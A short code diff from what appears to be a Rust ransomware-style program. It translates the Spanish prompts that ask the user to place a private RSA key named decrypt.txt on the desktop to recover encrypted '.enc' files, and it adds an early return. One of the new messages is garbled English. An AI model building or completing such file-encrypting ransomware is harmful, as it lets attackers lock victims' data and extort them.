@@ -62,15 +62,16 @@ fn encrypt_file(
 
 fn main() {
     let extensions = ["enc"];
-    println!("En el escritorio pon un archivo que se llame decrypt.txt con la llave privada RSA");
+    println!("On your desktop put the key provided (private RSA key) to you named decrypt.txt");
     let desktop_dir = dirs::desktop_dir().unwrap();
     let key_file_path = desktop_dir.join("decrypt.txt");
     if !key_file_path.exists(){
-        println!("Necesita la llave")
+        println!("NO key found")
     } else {
-        println!("{:?}", fs::read_to_string(key_file_path.clone()))
+        println!("{:?}", fs::read_to_string(key_file_path.clone()));
+        return;
     }
-    println!("Presiona enter si ya, si no lo archivos no se desencryptaran, presiona enter para continuar");
+    println!("If the the key is incorrect to rescue will be executed, press enter");
     let mut input = String::new();
     io::stdin()
         .read_line(&mut input)
